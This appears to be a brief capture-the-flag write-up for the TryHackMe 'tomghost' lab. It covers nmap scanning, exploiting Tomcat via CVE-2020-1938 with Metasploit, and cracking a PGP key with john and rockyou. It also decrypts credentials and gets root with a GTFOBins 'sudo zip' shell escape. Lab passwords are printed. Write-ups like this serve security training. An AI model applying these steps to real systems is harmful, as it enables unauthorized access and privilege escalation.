#### 07 AUG 2021 | tomghost 

#### ip : 10.10.169.221

# SCANNING

basic :
-------

$ nmap -sV -v 10.10.169.221  -oN nmap/intial


```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
8080/tcp open  http       Apache Tomcat 9.0.30

```
 

# CVE 2020-1938 

for tomcat 9.0.30

in metasploit run it  and return :


| skyfuck | 8730281lkjlkjdqlksalks |


$ssh skyfuck@ip 

and here we go we got a shell and can read the flag located in /home/merlin 

```
$sudo -l 

Sorry, user skyfuck may not run sudo on ubuntu.anguage

```



in skyfuck home we can found :

credential.pgp  tryhackme.asc

using  :
```
$gpg2john tryhackme.asc | tee hash_key
$john hash_key --wordlist=/usr/share/wordlists/rockyou.txt
```
found : alexandru        (tryhackme)

to decrypt the credintail.pgp :

reading https://superuser.com/questions/46461/decrypt-pgp-file-using-asc-key

```
$ gpg --import tryhackme.asc
$ gpg  -d credintial.pgp 

```
# results :

merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j                                                                                    


$su merlin




# Privilege escalation :



$sudo -l

`
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip`


https://gtfobins.github.io/gtfobins/zip/



```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```


# rooted 










